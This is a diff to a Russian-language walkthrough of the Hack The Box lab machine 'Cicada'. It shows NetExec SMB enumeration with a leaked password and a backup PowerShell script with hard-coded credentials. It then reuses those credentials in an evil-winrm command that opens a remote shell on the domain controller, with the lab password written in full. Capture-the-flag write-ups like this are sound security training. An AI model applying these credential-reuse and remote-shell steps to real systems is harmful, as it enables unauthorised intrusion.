@@ -374,7 +374,7 @@ whenChanged: 20250108084925.0Z
 ```vbnet
 Hexada@hexada ~/app/pentesting-tools/NetExec/nxc$ poetry run python netexec.py smb cicada.htb -u david.orelious -p 'aRt$L*****' --shares                                    130 ↵ main 
 SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
-SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
+SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$L*****
 SMB         10.10.11.35     445    CICADA-DC        [*] Enumerated shares
 SMB         10.10.11.35     445    CICADA-DC        Share           Permissions     Remark
 SMB         10.10.11.35     445    CICADA-DC        -----           -----------     ------
@@ -411,7 +411,7 @@ $sourceDirectory = "C:\smb"
 $destinationDirectory = "D:\Backup"
 
 $username = "emily.oscars"
-$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
+$password = ConvertTo-SecureString "Q!3@Lp#****" -AsPlainText -Force
 $credentials = New-Object System.Management.Automation.PSCredential($username, $password)
 $dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
 $backupFileName = "smb_backup_$dateStamp.zip"
@@ -421,7 +421,44 @@ Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath
 ```
 
 
-Это **power shell** скрипт
+Это **power shell** скрипт выполняет резервное копирование данных. Он включает следующие шаги:
+- Определяет исходную и целевую директории (`C:\smb` и `D:\Backup`)
+- Использует учетные данные для выполнения операций (утечка еще одной учетной записи)
+- Создает **ZIP**  архив файлов из исходной директории и сохраняет его в целевой директории с отметкой времени
+
+**WinRM** — это сервис, предоставляющий возможности удаленного администрирования через **HTTP** и **HTTPS**. Он является частью **Windows Management Framework** и ориентирован для выполнения команд на удаленной машине.
+
+Кстати, я обратил на кое что внимание, когда я только-только сканировал порты, на 5985 порте работал следуйщий сервис:
+```vbnet
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+```
+
+А если его сейчас сканровать, то вывод будет другой:
+```vbnet
+PORT     STATE SERVICE
+5985/tcp open  wsman
+```
+
+Давайте попробуем войти в **WinRM** через `emily.oscars`
+```vbnet
+Hexada@hexada ~/app/pentesting-tools/NetExec/nxc$ evil-winrm -i cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'                                                                      main 
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents>
+```
+
+
+
+
+
 
 
 
